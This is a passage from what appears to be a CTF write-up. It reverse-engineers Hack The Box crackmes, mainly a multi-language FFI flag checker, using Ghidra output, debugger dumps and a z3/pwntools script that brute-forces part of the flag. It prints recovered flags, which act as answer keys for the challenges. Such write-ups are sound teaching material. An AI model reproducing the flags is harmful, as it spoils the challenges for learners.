# Embedded file name: &lt;stdin&gt;
# Compiled at: 2022-05-21 08:39:47
f = [&#39;H&#39;, &#39;T&#39;, &#39;B&#39;, &#39;{&#39;, &#39;S&#39;, &#39;u&#39;, &#39;P&#39;, &#39;3&#39;, &#39;r&#39;, &#39;_&#39;, &#39;S&#39;, &#39;3&#39;, &#39;C&#39;, &#39;R&#39;, &#39;t&#39;, &#39;_&#39;, &#39;S&#39;, &#39;n&#39;, &#39;4&#39;, &#39;k&#39;, &#39;3&#39;, &#39;c&#39;, &#39;0&#39;, &#39;d&#39;, &#39;3&#39;, &#39;}&#39;]
return f[(pl / 5 % len(f))](venv2) 

out$ python
&gt;&gt;&gt; f = [&#39;H&#39;, &#39;T&#39;, &#39;B&#39;, &#39;{&#39;, &#39;S&#39;, &#39;u&#39;, &#39;P&#39;, &#39;3&#39;, &#39;r&#39;, &#39;_&#39;, &#39;S&#39;, &#39;3&#39;, &#39;C&#39;, &#39;R&#39;, &#39;t&#39;, &#39;_&#39;, &#39;S&#39;, &#39;n&#39;, &#39;4&#39;, &#39;k&#39;, &#39;3&#39;, &#39;c&#39;, &#39;0&#39;, &#39;d&#39;, &#39;3&#39;, &#39;}&#39;]
&gt;&gt;&gt; 
&gt;&gt;&gt; &#39;&#39;.join(f)
&#39;HTB{SuP3r_S3CRt_Sn4k3c0d3}&#39;
</code></pre><h1 id="7-freaky-forum-interception">7. Freaky Forum Interception</h1>
<p>Original files <a href="rev_ffi.zip">here</a>.</p>
<p>This one makes heavy use of <a href="https://en.wikipedia.org/wiki/Foreign_function_interface">FFI</a>, which makes it one big mess :-)</p>
<p>If we start with the <code>main</code> function, we understand that the flag will need to be of the following format:</p>
<p><code>HTB{part1_part2_part3_part4}</code></p>
<ul>
<li>part1 will be validated by the <code>GoCheck</code>function</li>
<li>part2 will be validated by the <code>rust_check</code> function</li>
<li>part3 will be validated by the <code>python_check</code> function</li>
<li>part4 will be validated by the <code>java_check</code>function.</li>
</ul>
<h2 id="71-gocheck">7.1 GoCheck</h2>
<p>When dealing with a Go binary in Ghidra, you might want to check the <code>Decompiler Parameter ID</code>in the analysis option (by pressing &lsquo;A&rsquo;) - otherwise most function calls will look like they have no parameters.</p>
<p>Basically there&rsquo;s a channel between <code>main.Waiter</code> and <code>main.Oracle</code>.</p>
<p>The <code>main.Oracle</code> is feeding expected characters and positions read from the data pointed by <code>main.g</code></p>
<pre tabindex="0"><code>                         main.g                                                       XREF[1]:   main.Oracle:001b6c92(R)  
      003491f0 40 bd 34 00 00 00 00     addr                 main..stmp_0
               00
</code></pre><p>we can quickly dump the table with GDB</p>
<pre tabindex="0"><code> ► 0x55555560accb &lt;main.Oracle+107&gt;    mov    rdx, qword ptr [rcx]          &lt;main..stmp_0&gt;

pwndbg&gt; x/16gx $rcx
0x55555579fd40 &lt;main..stmp_0&gt;:  	0x0000000000000002	0x0000000000000074
0x55555579fd50 &lt;main..stmp_0+16&gt;:	0x0000000000000006	0x0000000000000067
0x55555579fd60 &lt;main..stmp_0+32&gt;:	0x0000000000000003	0x0000000000000074
0x55555579fd70 &lt;main..stmp_0+48&gt;:	0x0000000000000004	0x0000000000000031
0x55555579fd80 &lt;main..stmp_0+64&gt;:	0x0000000000000001	0x0000000000000033
0x55555579fd90 &lt;main..stmp_0+80&gt;:	0x0000000000000000	0x0000000000000067
0x55555579fda0 &lt;main..stmp_0+96&gt;:	0x0000000000000005	0x000000000000006e
0x55555579fdb0:	0x0000000000000000	0x0000000000000000
</code></pre><p>first &ldquo;column&rdquo; is the position, 2nd one is the character</p>
<pre tabindex="0"><code>&gt;&gt;&gt; chr(0x0000000000000067) + chr(0x0000000000000033) + chr(0x0000000000000074) + chr(0x0000000000000074) + chr(0x0000000000000031) + chr(0x000000000000006e) + chr(0x0000000000000067)
&#39;g3tt1ng&#39;
</code></pre><h2 id="72-rust_check">7.2 rust_check</h2>
<p>It starts by checking the length of the flag part which must be 6 characters,</p>
<p>then checks that the sum of all input chars is 0x223:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">param_2</span> <span class="o">==</span> <span class="mi">6</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">bVar2</span> <span class="o">=</span> <span class="o">*</span><span class="n">input_flag</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">((</span><span class="n">byte</span><span class="p">)(</span><span class="o">~</span><span class="n">bVar2</span> <span class="o">&amp;</span> <span class="p">((</span><span class="n">byte</span><span class="p">)(</span><span class="n">bVar2</span> <span class="o">+</span> <span class="mh">0xbf</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mh">0x1a</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">5</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">bVar3</span> <span class="o">=</span> <span class="n">input_flag</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">((</span><span class="n">byte</span><span class="p">)(</span><span class="o">~</span><span class="n">bVar3</span> <span class="o">&amp;</span> <span class="p">((</span><span class="n">byte</span><span class="p">)(</span><span class="n">bVar3</span> <span class="o">+</span> <span class="mh">0xbf</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mh">0x1a</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">5</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">bVar4</span> <span class="o">=</span> <span class="n">input_flag</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">((</span><span class="n">byte</span><span class="p">)(</span><span class="o">~</span><span class="n">bVar4</span> <span class="o">&amp;</span> <span class="p">((</span><span class="n">byte</span><span class="p">)(</span><span class="n">bVar4</span> <span class="o">+</span> <span class="mh">0xbf</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mh">0x1a</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">5</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="n">bVar5</span> <span class="o">=</span> <span class="n">input_flag</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="p">((</span><span class="n">byte</span><span class="p">)(</span><span class="o">~</span><span class="n">bVar5</span> <span class="o">&amp;</span> <span class="p">((</span><span class="n">byte</span><span class="p">)(</span><span class="n">bVar5</span> <span class="o">+</span> <span class="mh">0xbf</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mh">0x1a</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">5</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                        <span class="n">bVar6</span> <span class="o">=</span> <span class="n">input_flag</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">                        <span class="k">if</span> <span class="p">((</span><span class="n">byte</span><span class="p">)(</span><span class="o">~</span><span class="n">bVar6</span> <span class="o">&amp;</span> <span class="p">((</span><span class="n">byte</span><span class="p">)(</span><span class="n">bVar6</span> <span class="o">+</span> <span class="mh">0xbf</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mh">0x1a</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">5</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                            <span class="n">bVar7</span> <span class="o">=</span> <span class="n">input_flag</span><span class="p">[</span><span class="mi">5</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">                            <span class="k">if</span> <span class="p">(((</span><span class="n">byte</span><span class="p">)(</span><span class="o">~</span><span class="n">bVar7</span> <span class="o">&amp;</span> <span class="p">((</span><span class="n">byte</span><span class="p">)(</span><span class="n">bVar7</span> <span class="o">+</span> <span class="mh">0xbf</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mh">0x1a</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">5</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
</span></span><span class="line"><span class="cl">                               <span class="p">((</span><span class="n">uint</span><span class="p">)</span><span class="n">bVar7</span> <span class="o">+</span> <span class="p">(</span><span class="n">uint</span><span class="p">)</span><span class="n">bVar6</span> <span class="o">+</span> <span class="p">(</span><span class="n">uint</span><span class="p">)</span><span class="n">bVar5</span> <span class="o">+</span> <span class="p">(</span><span class="n">uint</span><span class="p">)</span><span class="n">bVar4</span> <span class="o">+</span> <span class="p">(</span><span class="n">uint</span><span class="p">)</span><span class="n">bVar2</span> <span class="o">+</span> <span class="p">(</span><span class="n">uint</span><span class="p">)</span><span class="n">bVar3</span> <span class="o">==</span> <span class="mh">0x223</span><span class="p">))</span> <span class="p">{</span>
</span></span></code></pre></div><p>afterwards it checks that:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"> <span class="p">((((((</span><span class="n">ulong</span><span class="p">)</span><span class="o">*</span><span class="n">input_flag</span> <span class="o">*</span> <span class="mi">3</span> <span class="o">+</span> <span class="p">(</span><span class="n">ulong</span><span class="p">)</span><span class="n">input_flag</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">*</span> <span class="mi">3</span> <span class="o">+</span> <span class="p">(</span><span class="n">ulong</span><span class="p">)</span><span class="n">input_flag</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span> <span class="o">*</span> <span class="mi">3</span> <span class="o">+</span>
</span></span><span class="line"><span class="cl">  <span class="p">(</span><span class="n">ulong</span><span class="p">)</span><span class="n">input_flag</span><span class="p">[</span><span class="mi">3</span><span class="p">])</span> <span class="o">*</span> <span class="mi">3</span> <span class="o">+</span> <span class="p">(</span><span class="n">ulong</span><span class="p">)</span><span class="n">input_flag</span><span class="p">[</span><span class="mi">4</span><span class="p">])</span> <span class="o">*</span> <span class="mi">3</span> <span class="o">+</span> <span class="p">(</span><span class="n">ulong</span><span class="p">)</span><span class="n">input_flag</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x8dd3</span><span class="p">))</span>
</span></span></code></pre></div><p>then it calls this from_iter() and build and compare the resulting array to some hardcoded table.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl">  <span class="o">&lt;</span><span class="n">alloc</span><span class="o">::</span><span class="n">vec</span><span class="o">::</span><span class="n">Vec</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span><span class="n">as_alloc</span><span class="o">::</span><span class="n">vec</span><span class="o">::</span><span class="n">spec_from_iter</span><span class="o">::</span><span class="n">SpecFromIter</span><span class="o">&lt;</span><span class="n">T</span><span class="p">,</span><span class="n">I</span><span class="o">&gt;&gt;::</span><span class="nf">from_iter</span>
</span></span><span class="line"><span class="cl">            <span class="p">(</span><span class="o">&amp;</span><span class="n">local_68</span><span class="p">,(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">ptr_input_flag</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">local_58</span> <span class="o">==</span> <span class="mi">6</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">iVar8</span> <span class="o">=</span> <span class="nf">bcmp</span><span class="p">(</span><span class="n">local_68</span><span class="p">,</span><span class="n">QWORD_ARRAY_00279ca0</span><span class="p">,</span><span class="mh">0x30</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">bVar10</span> <span class="o">=</span> <span class="n">iVar8</span> <span class="o">==</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span></code></pre></div><p>This <code>from_iter</code> function sums the first and last chr, the 2nd and before-last, etc&hellip;</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl">    <span class="n">flag_chr0</span> <span class="o">=</span> <span class="o">*</span><span class="n">param_2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">flag_char1</span> <span class="o">=</span> <span class="n">param_2</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="n">flag_char2</span> <span class="o">=</span> <span class="n">param_2</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="n">flag_char3</span> <span class="o">=</span> <span class="n">param_2</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="n">lVar1</span> <span class="o">=</span> <span class="n">flag_chr0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(;</span> <span class="p">(</span><span class="n">lVar1</span> <span class="o">!=</span> <span class="n">flag_char1</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">flag_char3</span> <span class="o">!=</span> <span class="n">flag_char2</span><span class="p">));</span> <span class="n">flag_char3</span> <span class="o">=</span> <span class="n">flag_char3</span> <span class="o">+</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="o">*</span><span class="p">(</span><span class="n">ulong</span> <span class="o">*</span><span class="p">)(</span><span class="n">buffer</span> <span class="o">+</span> <span class="n">i</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span> <span class="o">=</span> <span class="p">(</span><span class="n">ulong</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">byte</span> <span class="o">*</span><span class="p">)(</span><span class="n">flag_char3</span> <span class="o">+</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">ulong</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">byte</span> <span class="o">*</span><span class="p">)(</span><span class="n">flag_chr0</span> <span class="o">+</span> <span class="n">i</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">lVar1</span> <span class="o">=</span> <span class="n">flag_chr0</span> <span class="o">+</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="n">param_1</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
</span></span></code></pre></div><p>if we dump the table we are looking for we have enough informations to guess this part of the flag:</p>
<pre tabindex="0"><code>pwndbg&gt; x/48bx $rsi
0x5555556cdca0:	0xdf	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x5555556cdca8:	0xdd	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x5555556cdcb0:	0x67	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x5555556cdcb8:	0x67	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x5555556cdcc0:	0xdd	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x5555556cdcc8:	0xdf	0x00	0x00	0x00	0x00	0x00	0x00	0x00
</code></pre><p>which means we need:</p>
<pre tabindex="0"><code>flag[0] + flag[5] == 0xdf
flag[1] + flag[4] == 0xdd
flag[2] + flag[3] == 0x67
</code></pre><p>People who like to suffer can keep reversing rust for more hints, at this point I just bruteforced it:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">z3</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">FLAG</span> <span class="o">=</span> <span class="s2">&#34;HTB{g3tt1ng_</span><span class="si">%s</span><span class="s2">_part3_part4}&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">Solver</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">c</span> <span class="o">=</span> <span class="n">BitVec</span><span class="p">(</span><span class="s1">&#39;f</span><span class="si">%d</span><span class="s1">&#39;</span><span class="o">%</span><span class="n">x</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">flag</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">add</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="n">Or</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">                <span class="n">And</span><span class="p">(</span><span class="n">c</span> <span class="o">&gt;=</span> <span class="mi">48</span><span class="p">,</span> <span class="n">c</span> <span class="o">&lt;</span> <span class="mi">65</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">                <span class="n">And</span><span class="p">(</span><span class="n">c</span> <span class="o">&gt;</span> <span class="mi">90</span><span class="p">,</span> <span class="n">c</span> <span class="o">&lt;=</span> <span class="mi">122</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">flag</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="n">flag</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="n">flag</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="n">flag</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">+</span> <span class="n">flag</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">+</span> <span class="n">flag</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x223</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">add</span><span class="p">(((((</span><span class="n">flag</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">3</span> <span class="o">+</span> <span class="n">flag</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">*</span> <span class="mi">3</span> <span class="o">+</span> <span class="n">flag</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span> <span class="o">*</span> <span class="mi">3</span> <span class="o">+</span> <span class="n">flag</span><span class="p">[</span><span class="mi">3</span><span class="p">])</span> <span class="o">*</span> <span class="mi">3</span> <span class="o">+</span> <span class="n">flag</span><span class="p">[</span><span class="mi">4</span><span class="p">])</span> <span class="o">*</span> <span class="mi">3</span> <span class="o">+</span> <span class="n">flag</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x8dd3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">flag</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="n">flag</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0xdf</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">flag</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="n">flag</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0xdd</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">flag</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="n">flag</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x67</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;error&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">check</span><span class="p">(</span><span class="n">password</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./ffi&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">FLAG</span><span class="o">%</span><span class="n">password</span><span class="p">,</span> <span class="s1">&#39;ascii&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="sa">b</span><span class="s1">&#39;Rust says no!&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">FLAG</span><span class="o">%</span><span class="n">password</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="n">s</span><span class="o">.</span><span class="n">check</span><span class="p">()</span> <span class="o">==</span> <span class="n">sat</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">m</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">model</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">condition</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">out</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">flag</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">        <span class="n">c</span> <span class="o">=</span> <span class="n">m</span><span class="p">[</span><span class="n">flag</span><span class="p">[</span><span class="n">x</span><span class="p">]]</span><span class="o">.</span><span class="n">as_long</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">out</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">condition</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">flag</span><span class="p">[</span><span class="n">x</span><span class="p">]</span> <span class="o">!=</span> <span class="nb">int</span><span class="p">(</span><span class="n">m</span><span class="p">[</span><span class="n">flag</span><span class="p">[</span><span class="n">x</span><span class="p">]]</span><span class="o">.</span><span class="n">as_long</span><span class="p">()))</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">Or</span><span class="p">(</span><span class="n">condition</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">check</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>
</span></span></code></pre></div><pre tabindex="0"><code>% python rust_gen2.py
HTB{g3tt1ng_fr34ky_part3_part4}
</code></pre><h2 id="73-python_check">7.3 python_check</h2>
<p>the python check expects a 5 chrs flag</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">len</span> <span class="o">==</span> <span class="mi">5</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">Py_Initialize</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="nf">seed</span><span class="p">(</span><span class="mh">0x7a69</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">GetNum</span> <span class="o">=</span> <span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="nf">PyCMethod_New</span><span class="p">(</span><span class="o">&amp;</span><span class="n">GenDef</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">5</span><span class="p">;</span> <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">num</span> <span class="o">=</span> <span class="nf">PyObject_CallNoArgs</span><span class="p">(</span><span class="n">GetNum</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">key_char</span> <span class="o">=</span> <span class="nf">PyLong_AsLong</span><span class="p">(</span><span class="n">num</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nf">Py_DecRef</span><span class="p">(</span><span class="n">num</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">((</span><span class="n">local_1e</span> <span class="o">==</span> <span class="sc">&#39;\0&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="p">((</span><span class="n">uint</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">byte</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="o">&amp;</span><span class="n">secret</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">i</span><span class="p">)</span> <span class="o">!=</span> <span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">flag</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="p">(</span><span class="n">uint</span><span class="p">)</span><span class="n">key_char</span><span class="p">)))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">local_1e</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">local_1e</span> <span class="o">=</span> <span class="sc">&#39;\x01&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nf">_Py_DECREF</span><span class="p">(</span><span class="n">GetNum</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">Py_Finalize</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></div><ul>
<li>it initializes the seed with 0x7a69</li>
<li>then for every chrs
<ul>
<li>calls a python method</li>
<li>cast the result to long</li>
<li>check that flag[i] ^ result == secret[i]</li>
</ul>
</li>
</ul>
<p>the <code>seed</code> function calls the python <code>random.seed()</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">seed</span><span class="p">(</span><span class="kt">int</span> <span class="n">seed_value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">long</span> <span class="o">*</span><span class="n">method_seed</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">undefined8</span> <span class="n">seed</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">long</span> <span class="o">*</span><span class="n">seed_tuple</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">randomMod</span> <span class="o">=</span> <span class="nf">PyImport_ImportModule</span><span class="p">(</span><span class="s">&#34;random&#34;</span><span class="p">);</span>
